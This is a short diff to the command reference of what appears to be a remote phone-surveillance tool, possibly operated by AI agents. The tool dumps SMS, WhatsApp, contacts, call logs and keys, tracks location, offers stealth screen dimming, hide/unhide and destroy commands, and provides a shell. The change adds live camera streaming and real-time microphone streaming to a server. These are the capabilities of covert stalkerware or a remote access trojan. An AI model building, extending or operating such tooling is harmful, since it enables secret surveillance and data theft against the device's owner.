@@ -52,7 +52,9 @@ list/status/devices; device info; files ls/tree/get/put/find/thumb/watch;
 sms recent/dump/send; wa dump; contacts; calls dump; notif stream/dump;
 keys dump; screen live/shot/record/start/stop; tap; type; key; unlock/lock;
 brightness get/set (0–255, stealth dimming); volume get/set/mute (streams:
-ring/media/alarm); cam snap/record (front/back); mic record; loc
+ring/media/alarm); cam snap/record (front/back); cam live --quality <low|med|high|1080p|720p|480p>
+(--quality selects resolution/bitrate, modifiable per stream); mic record;
+mic live (real-time audio stream to server); loc
 once/track/history/geofence; app list/open; shell; update; destroy;
 hide/unhide; watch --notif --files --loc (persistent event stream for agents).
 
